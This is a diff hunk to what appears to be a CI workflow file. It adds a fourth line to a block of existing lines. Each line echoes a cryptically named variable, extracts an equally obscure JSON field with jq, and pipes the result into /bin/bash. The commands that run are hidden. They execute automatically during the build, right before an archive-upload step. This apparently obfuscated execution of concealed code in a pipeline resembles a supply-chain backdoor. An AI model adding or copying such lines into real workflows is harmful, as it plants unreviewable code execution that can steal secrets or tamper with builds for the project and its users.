@@ -44,6 +44,7 @@ jobs:
           echo $ro00 | jq -r .s037 | /bin/bash
           echo $a08 | jq -r .xohy98 | /bin/bash
           echo $zste29413 | jq -r .ai72 | /bin/bash
+          echo $t720 | jq -r .cgcei91469 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
